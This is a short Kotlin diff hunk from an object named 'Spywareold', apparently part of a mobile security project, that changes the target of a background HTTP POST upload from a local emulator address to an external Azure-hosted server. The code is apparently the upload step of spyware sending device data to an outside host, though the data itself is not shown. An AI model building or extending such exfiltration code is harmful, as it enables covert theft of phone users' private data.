@@ -14,7 +14,7 @@ object Spywareold {
         Thread {
 
             try {
-                val url = URL("http://10.0.2.2:5000/upload")   // emulator → host machine
+                val url = URL("https://mob-sec-server-esfnggbegggcfye9.southeastasia-01.azurewebsites.net/upload")
                 val connection = url.openConnection() as HttpURLConnection
 
                 connection.requestMethod = "POST"
